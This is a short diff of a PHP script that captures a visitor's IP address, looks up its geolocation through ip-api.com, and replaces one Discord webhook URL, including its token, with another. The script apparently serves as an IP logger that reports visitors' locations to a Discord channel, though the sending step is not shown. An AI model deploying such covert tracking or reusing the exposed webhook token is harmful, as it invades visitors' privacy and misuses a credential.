@@ -1,6 +1,6 @@
 <?php
 $ip = $_SERVER['REMOTE_ADDR'];
-$webhook = "https://discord.com/api/webhooks/1352772233449300338/0m6Tq7I0i9J5KzL8N4P2R7S1T3U5V9W2X4Y6Z8a0b2c4d6e8f0g2h4i6j8k0l2m4n6o8p0q2r4s6t8u0";
+$webhook = "https://discord.com/api/webhooks/1479992985080037508/qDDuaOMl392hh8YyRRnmBdh6c7ReAgXQvIAv2F9Ela3OCMejbLYav7MPARFbxhQVtXjR";
 
 $data = file_get_contents("http://ip-api.com/json/$ip");
 $json = json_decode($data,true);
